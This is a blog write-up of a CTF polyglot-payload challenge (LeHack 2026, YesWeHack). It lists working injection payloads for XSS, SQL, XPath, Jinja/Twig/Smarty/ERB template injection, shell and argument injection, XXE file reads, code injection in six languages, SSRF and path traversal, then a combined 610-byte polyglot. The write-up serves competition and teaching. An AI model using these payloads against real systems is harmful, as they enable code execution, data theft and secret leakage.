+++
title = "LeHack 2026 - Payload PLZ Reloaded"
date = "2026-06-28"
description = ""
[extra]
cover.image = "images/LeHACK2026/payloadplzreloaded.png"
cover.alt = "LeHack 2026 - Payload PLZ Reloaded"
+++

Another year, another great challenge from YesWeHack. It was the same rules as last year, find the shortest polyglot payload that triggers in the maximum contexts, but this time we had 22 contexts instead of the 13 of 2025. More than enough to melt my brain again 🤯.

<!--more-->

The scoring formula was:

```text
score = (number of challenges solved * 1000) - payload length
```

That made the challenge a balancing act between coverage and size. A long payload that solved more contexts was not always better than a shorter one, and every separator mattered because the same byte was parsed as SQL, XML, HTML, shell, template syntax, Brainfuck, URL text, filesystem path, and source code in several languages.

## Challenges

The payload was built by first solving each parser in isolation, then merging fragments that were harmless or useful in the other contexts. This section documents the raw challenge context for each task and the standalone input that solves it before any polyglot constraints are applied.

| Context language    | Payload                                              |
|---------------------|------------------------------------------------------|
| XSS 1               | `<script>alert(flag)</script>`                       |
| XSS 2               | `'; alert(flag); //`                                 |
| SQLi 1              | `' UNION SELECT flag, NULL, NULL FROM flag --`       |
| SQLi 2              | `0 UNION SELECT flag, NULL, NULL FROM flag`          |
| XPath Injection     | `[\"]\|*?`                                           |
| Jinja SSTI          | `{{ lipsum.__globals__["os"].popen('env').read() }}` |
| Brainfuck           | `[.>],[.,]`                                          |
| ERB SSTI            | `<%= ENV['FLAG'] %>`                                 |
| Twig SSTI           | `{{['env']\|filter('system')}}`                      |
| Smarty SSTI         | `{system('env')}`                                    |
| Command Injection 1 | `';env;#`                                            |
| Command Injection 2 | `";env;#`                                            |
| Argument Injection  | `a -o -exec printenv FLAG {} +`                      |
| XXE                 | `<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///dev/shm/flag.txt'>]><root>&test;</root>` |
| Python              | `"; print(__import__('os').environ['FLAG']); x="`    |
| JavaScript          | `"; console.log(process.env.FLAG); const x="`        |
| Ruby                | `"; puts ENV['FLAG']; x="`                           |
| PHP                 | `"; echo getenv('FLAG'); $x="`                       |
| Lua                 | `"; print(os.getenv('FLAG')); local x="`             |
| Perl                | `"; print $ENV{FLAG}; my $x="`                       |
| SSRF                | `127.0.0.1/flag`                                     |
| Path Traversal      | `/../../../../dev/shm/flag.txt`                      |

The following subsections, will have a short explanation for each context and a bit more details when the payload could be shorten or merged with another context. Jump to the [Polyglot](#polyglot) section if you only care about the tips and tricks used in the final payload.


### XSS 1

**Description**: execute JavaScript in a Chromium page where input is injected inside an HTML heading. The winning condition is `alert(flag)`.

**Source**:

```html
<h1>Hello $INPUT</h1>
```

**Input**:

```html
<script>alert(flag)</script>
```

In the final payload this became an SVG event handler because it was shorter and also worked for the second XSS context after closing the script tag.

### XSS 2

**Description**: execute JavaScript in a Chromium page where input is injected inside a single-quoted JavaScript string in a script block. The winning condition is `alert(flag)`.

**Source**:

```html
<script>const x = '$INPUT'</script>
```

**Input**:

```javascript
'; alert(flag); //
```

The polyglot version instead used `</script><svg onload=alert(flag)>`, which avoids needing a JavaScript-line comment that would interfere with other parsers.

ℹ️ In HTML context, the `<script>` tag is allowed to fail, you can have as much garbage as you want in it. If you close the context and open a new one, the Javascript code will not be impacted by the garbage before.

### SQL Injection 1

**Description**: extract the flag from a SQLite `flag` table. The input is normalized with NFKC before being inserted into a quoted string.

**Source**:

```sql
SELECT * FROM users WHERE username = '$INPUT.normalize("NFKC")'
```

**Input**:

```sql
' UNION SELECT flag, NULL, NULL FROM flag --
```

The important merge trick was replacing the ASCII quote with `＇`, which normalizes to `'` only in the SQLi 1 context. 

ℹ️ Refer to last year blog post for the NFKC table: [payload-plz/#sql-1-and-sql-2](https://swisskyrepo.github.io/blog/payload-plz/#sql-1-and-sql-2)


### SQL Injection 2

**Description**: extract the flag from SQLite, this time from an unquoted numeric context.

**Source**:

```sql
SELECT * FROM users WHERE age > $INPUT
```

**Input**:

```sql
0 UNION SELECT flag, NULL, NULL FROM flag
```

This context forced the final payload to begin with a valid numeric SQL expression. That requirement is the core reason XXE could not be merged into the final 20/22 payload. More on this in the Polyglot section.

### XPath Injection

**Description**: extract the password of the `admin` user from an XML document where the query initially checks the `guest` user.

**Source**:

```xpath
//user[name/text()="guest" and password/text()="$INPUT"]/name/text()
```

**Input**:

```xpath
[\"]\|*?
```

Same as last year, thank you. I hate XPATH 💔


### Jinja SSTI

**Description**: exploit a Jinja2 template injection where the flag is available in the environment.

**Source**:

```jinja2
Hello $INPUT
```

**Input**:

```jinja2
{{ lipsum.__globals__["os"].popen('env').read() }}
```

The merged payload used `lipsum.__globals__.os.environ` to expose the environment while sharing syntax with Twig.

### Brainfuck

**Description**: Provide a valid Brainfuck program that outputs the flag. The flag is split into two parts: the first half is stored in memory starting at address `0`, and the second half is available on stdin. Invalid Brainfuck commands are removed. The runner has a maximum of `10 * 1000` operations.

**Source**:

```brainfuck
$INPUT.replace(/[^><+\-.,\[\]]/g, "")
```

**Input**:

```brainfuck
[.>],[.,]
```

This was one of the easiest fragments to embed because all other parser syntax is ignored by the Brainfuck sanitizer.

ℹ️ You can put it anywhere in your payload, and then ask Claude to fix whatever failed. I chose to put around the start of the polyglot, because the "," character from the SQL injection and the "<" character from the XSS would break it. All the characters below are valid brainfuck instructions.

| Character | Instruction Performed |
| --------- | ------------------------------------------------------------- |
| `>`       | Increment the data pointer by one, to point to the next cell to the right.|
| `<`       | Decrement the data pointer by one, to point to the next cell to the left. Undefined if at 0.|
| `+`       | Increment the byte at the data pointer by one modulo 256.|
| `-`       | Decrement the byte at the data pointer by one modulo 256.|
| `.`       | Output the byte at the data pointer.|
| `,`       | Accept one byte of input, storing its value in the byte at the data pointer.|
| `[`       | If the byte at the data pointer is zero, then instead of moving the instruction pointer forward to the next command, jump it forward to the command after the matching `]` command. |
| `]`       | If the byte at the data pointer is nonzero, then instead of moving the instruction pointer forward to the next command, jump it back to the command after the matching `[` command. |

### ERB SSTI

**Description**: exploit a Ruby ERB template injection where the flag is available in the environment.

**Source**:

```erb
Hello $INPUT!
```

**Input**:

```erb
<%= ENV['FLAG'] %>
```

ℹ️ The final payload used `<%=ENV.to_h%>` because printing the whole environment satisfied the oracle and was easier to merge with the surrounding bytes.

### Twig SSTI

**Description**: exploit a Twig SSTI in sandbox mode where the flag is stored in the environment.

**Source**:

```twig
Hello $INPUT
```

**Input**:

```twig
{{['env']|filter('system')}}
```

The final payload shared the expression shape with Jinja and used `map('system')` as the Twig execution primitive.

### Smarty SSTI

**Description**: exploit a Smarty template injection where the flag is stored in the environment.

**Source**:

```smarty
Hello $INPUT
```

**Input**:

```smarty
{system('env')}
```

The final payload used `{system(env)}` and a Smarty comment to hide the Jinja/Twig expression from Smarty.

### Command Injection 1

**Description**: execute a command from inside a single-quoted argument to `ping` and read the flag from the environment.

**Source**:

```bash
ping -W 1 -c 1 '$INPUT'
```

**Input**:

```bash
';env;#
```

The quote exits the ping argument, `env` prints the flag-bearing environment, and `#` comments the remaining quote.

### Command Injection 2

**Description**: execute a command from inside a double-quoted `echo` argument and read the flag from the environment.

**Source**:

```bash
echo -n "Welcome user: $INPUT"
```

**Input**:

```bash
";env;#
```

ℹ️ In the final payload, it was solved with backtick command substitution so that the shell and the code runners disagreed about what the quote was doing.

### Argument Injection

**Description**: inject arguments into an existing `find` command built with `escapeshellcmd($payload)`.

**Source**:

```bash
shell_exec("find /tmp -type d -name " . escapeshellcmd($payload))
```

Input code:

```bash
$INPUT
```

**Input**:

```bash
a -o -exec printenv FLAG {} +
```

The final payload used `-o -exec env ; -name ...`, and avoiding literal spaces before that suffix became a major constraint.

### XXE

**Description**: read `/dev/shm/flag.txt` through an XML parser configured with `load_dtd=True`, `no_network=False`, and `resolve_entities=True`.

**Source**:

```xml
<?xml version="1.0"?>
$INPUT
```

**Input**:

```xml
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///dev/shm/flag.txt'>]><root>&test;</root>
```

This was solved by an alternate XML-first branch, but not by the final payload because its leading XML structure conflicts with SQLi2.

ℹ️ Since there is a conflict between SQLi 2 and XXE, only the smallest was kept in the final payload.

### Python Code Injection

**Description**: inject Python source into a double-quoted string assignment and print the flag from the environment.

**Source**:

```python
value = "$INPUT"
```

**Input**:

```python
"; print(__import__('os').environ['FLAG']); x="
```

The final fallback branch used `__import__('os').system('env')` because printing the environment was accepted by the oracle.

### JavaScript Code Injection

**Description**: inject JavaScript source into a double-quoted string assignment and print the flag from `process.env.FLAG`.

**Source**:

```javascript
const value = "$INPUT"
```

**Input**:

```javascript
"; console.log(process.env.FLAG); const x="
```

This context was not solved in the final payload because the raw double quote needed to escape Node also escapes the Python, Ruby, PHP, and Perl wrappers too early.

ℹ️ I believe there is still a way to make it work, but I wasn't able to find it in the required time.

### Ruby Code Injection

**Description**: inject Ruby source into a double-quoted string assignment and print the flag from the environment.

**Source**:

```ruby
value = "$INPUT"
```

**Input**:

```ruby
"; puts ENV['FLAG']; x="
```

ℹ️ The final branch used Ruby truthiness: `0` is truthy in Ruby, so Ruby enters the first dispatcher and runs `system('env')`.

### PHP Code Injection

**Description**: inject PHP source into a double-quoted string assignment and print the flag from the environment.

**Source**:

```php
$value = "$INPUT";
```

**Input**:

```php
"; echo getenv('FLAG'); $x="
```

ℹ️ The final payload also uses PHP's real `__halt_compiler()` to stop PHP parsing before the Lua-style `--` comment suffix.

### Lua Code Injection

**Description**: inject Lua source into a double-quoted string assignment and print the flag from the environment.

**Source**:

```lua
local value = "$INPUT"
```

**Input**:

```lua
"; print(os.getenv('FLAG')); local x="
```

The final payload used `os.execute('env')` in a `print(...)` wrapper because Lua does not allow a bare boolean expression as a statement.

### Perl Code Injection

**Description**: inject Perl source into a double-quoted string assignment and print the flag from the environment.

**Source**:

```perl
my $value = "$INPUT";
```

**Input**:

```perl
"; print $ENV{FLAG}; my $x="
```

The final branch used `system('env')` and tolerated later runtime errors because the oracle accepted output that already contained the flag.

### SSRF

**Description**: make the backend fetch an internal `/flag` endpoint. The challenge prepends `http://`, sends `FLAG` as request data, and reads up to 1024 bytes from the response.

**Source**:

```text
http://$INPUT
```

**Input**:

```text
127.0.0.1/flag
```

ℹ️ The final payload used `@0/flag#`: the preceding bytes became URL userinfo, `0` became the host, `/flag` became the path, and `#` hid the rest as a fragment.

### Path Traversal

**Description**: read `/dev/shm/flag.txt` after the backend joins input with `/tmp`, normalizes the path, and opens it.

**Source**:

```text
$INPUT
```

**Input**:

```text
/../../../../dev/shm/flag.txt
```

The final suffix kept enough `../` segments to normalize from the `/tmp` base to the flag file.


## Polyglot

Let's summarize the different tricks and constraint used to build the polyglot:

- Start with either XXE or SQLi 2 because they are mutually exclusive
- End with `/dev/shm/flag.txt` and enought `../` to remove the `/` left by other payloads
- Use the URL format `user:pass@host/endpoint#fragment` to insert other payloads
- Localhost has a few equivalent addresses like `http://0` and `http://0.0.0.0`
- `__halt_compiler()` function stops PHP interpreter. [php.net/halt-compiler](https://www.php.net/manual/en/function.halt-compiler.php)
- Use the NFKC normalization for the SQLi 1 payload
- Ending a `<script>` tag and opening a new one can be used to place the garbage code in the first tag without affecting the second context.
- Most of the time calling directly the environment loaded inside the current script instead of calling the function is shorter
- Claude is your best friend when it comes to fix your brainfuck payloads and find "keywords/features" in the language RFC.
- Use type juggling to branch between each languages (Python, PHP, Lua, Perl, Ruby)

| Language | `0` truthy? | `self` truthy? | Branch |
|---|---:|---:|---|
| Ruby | yes | yes | Ruby `system('env')` |
| Lua | yes | no / nil | Lua `os.execute('env')` |
| Python | no | not reached | Python fallback |
| PHP/Perl | no-ish for this selector | not reached | PHP/Perl branch |

My first payload working with the XXE context looked like that:

```xml
<?or 1 union select ＂>[.>],[.,]＂,flag,0 from flag--＇union select flag,0,0 from flag--?><!DOCTYPE a[<!ENTITY b SYSTEM 'file:///dev/shm/flag.txt'>]><a>&b;</a></script><img src=x onerror=alert(flag)>{system('env')}{*{%if lipsum is defined%}{{lipsum.__globals__['os'].system('env')}}{%else%}{{['env']|filter('system')}}{%endif%}*}<%=`env`%>';env;'"]|*?>";print $ENV{FLAG}#/../../../../../../../proc/self/environ
```

My first working non-XXE baseline solved 18 contexts with a compact SQL/HTML/template/shell/path payload. It failed Python, JavaScript, Lua, and XXE. Adding Python raised the result to 19/22 by using a truthiness selector shared by Python, Ruby, PHP, and Perl. Adding Lua required a larger rewrite because Lua cannot execute a bare `and/or` expression as a statement; wrapping the dispatcher in `print(...)` made it valid Lua and produced the final 20/22 branch.

Several constraints made the merge fragile.

Normal spaces were expensive because Bash3 used `escapeshellcmd($payload)` inside `find /tmp -type d -name ...`. Extra spaces inside the runtime branch split the argument too early and broke the final `-o -exec env` suffix. The final runtime branch therefore uses no-space forms such as `define_method(:__halt_compiler){}` and `*__halt_compiler=sub{}`.

The code runners parsed the entire payload, not just the first executed statement. That meant a successful `env` print was useless if another language saw a parse error before execution. The `__halt_compiler();pos=0;--pos#` tail was the key bridge for PHP, Lua, Python, Ruby, and Perl, because it let each parser ignore the Bash/path suffix in a different way.

JavaScript was the remaining code-runner problem. A raw JavaScript breakout like `";console.log(process.env.FLAG)//` works for Node, and SQLite even accepts it inside a quoted alias in a spare UNION column. However, the same raw double quote also closes the Python, Ruby, PHP, and Perl wrappers too early, moving execution before the carefully balanced dispatcher. 

Encoding tricks such as HTML entities, `%22`, `\x22`, `\u0022`, and fullwidth quotes did not help because the Node source parser does not HTML-decode or URL-decode source bytes. A later interpolation branch solved JavaScript in targeted tests, but it lost Lua and Smarty in the full run, so it did not beat the 20/22 payload.

XXE and SQLi2 were the other major conflict. XXE wants the payload to be XML-shaped immediately after `<?xml version="1.0"?>`, with a `<!DOCTYPE ...>` before the root element. SQLi2 wants the same payload to be a valid SQLite expression immediately after `age >`, which means it must start as a numeric SQL expression. Starting with XML (`<!--...<!DOCTYPE...`) solves XXE but SQLite rejects it in SQLi2. Starting with `0 union select ...` solves SQLi2 but cannot be parsed as a pre-root XML DTD. We built an XXE-first branch using XML comments, CR as XML-safe whitespace, and URL userinfo tricks; it solved XXE but lost SQLi2. We also tried transplanting separators, but form-feed is invalid in XML grammar and `--` cannot appear freely inside XML comments. Without a new parser differential that makes the same leading bytes both valid SQL numeric expression and valid XML pre-root/DOCTYPE structure, XXE and SQLi2 remained unmergeable.

The final verified payload therefore intentionally maximized the stable non-XXE route and accepted two failures: `XXE` and `JavaScript`.

Polyglot fragment summary:

| context language | payload |
|---|---|
| XSS 1 HTML | `<svg\fonload=alert(flag)>` via the shared `</script><svg\fonload=alert(flag)>` fragment |
| XSS 2 script string | `</script><svg\fonload=alert(flag)>` |
| SQLi 1 quoted SQLite with NFKC | `＇union\fselect*,0,0\ffrom\fflag--` |
| SQLi 2 unquoted SQLite | `0\funion\fselect\f2...,*,*from\fflag--` |
| XPath | `[\"]\|*?` |
| Jinja | `{{['env']\|map('system')and\flipsum.__globals__.os.environ}}` |
| Brainfuck | `[.>],[.,]` |
| ERB | `<%=ENV.to_h%>` |
| Twig | `{{['env']\|map('system')...}}` |
| Smarty | `{system(env)}` |
| Bash 1 | `';env;#` |
| Bash 2 | `` `env;'";..."` `` command-substitution desync |
| Bash 3 / find argument injection | `-o -exec env ; -name ...` |
| XXE | Not in final payload; solved only by the alternate XML-first branch |
| Python | `__import__('os').system('env')` in the fallback branch |
| JavaScript | Not solved in final payload |
| Ruby | `system('env')` in the `0` truthy + `self` branch |
| PHP | `system('env')` plus real `__halt_compiler()` |
| Lua | `rawset(...print)and os.execute('env')` in the `0` truthy + no-`self` branch |
| Perl | `system('env')or eval('*__halt_compiler=sub{}')or 1` |
| SSRF | `@0/flag#` after userinfo bytes |
| Path traversal | `/../../../../dev/shm/flag.txt` |


## Conclusion

This year again the challenge was fun and the web interface was very stable, shoutout to the organizer [@yeswehack](https://x.com/yeswehack) and the authors [@BitK_](https://x.com/BitK_) && [@Brumens2](https://x.com/Brumens2).

Now I'm expecting a 3rd edition with 50+ contexts, I don't know if the infrastructure could handle it but that would be evil 😈


### Side Note

Side note for the other challengers. 

Some of you came last friday (06/26/2026) on this blog to copy last year payload, well played 😏.
Here is my final solution for the challenge, it is not the best, but maybe it could help you for 2027 edition ? 🤫

```text
0\funion\fselect\f2`[.>],[.,]`,*,*from\fflag--@0/flag#＇union\fselect*,0,0\ffrom\fflag--</script><svg\fonload=alert(flag)>';env;#<%=ENV.to_h%>{system(env)}{*{{['env']|map('system')and\flipsum.__globals__.os.environ}}*}[\"]|*?`env;";print(((0)and(self and(eval('define_method(:__halt_compiler){}')and system('env'))or(rawset(_G,'__halt_compiler',rawget(_G,'print'))and os.execute('env')))or('0'==0)and(system('env')or eval('*__halt_compiler=sub{}')or 1)or(globals().__setitem__('__halt_compiler',bool)or __import__('os').system('env'))));__halt_compiler();pos=0;--pos#"` -o -exec env ; -name /../../../../dev/shm/flag.txt
```

Final result:

| Info |  |
|---|---|
| Solved | `20/22` |
| Score | `19390` |
| Length | `610` |
| Global leaderboard | 3rd |
| On-site leaderboard | 2nd |
| Failed contexts | `xxe`, `javascript` |


![](/images/LeHACK2026/scoreboard.png)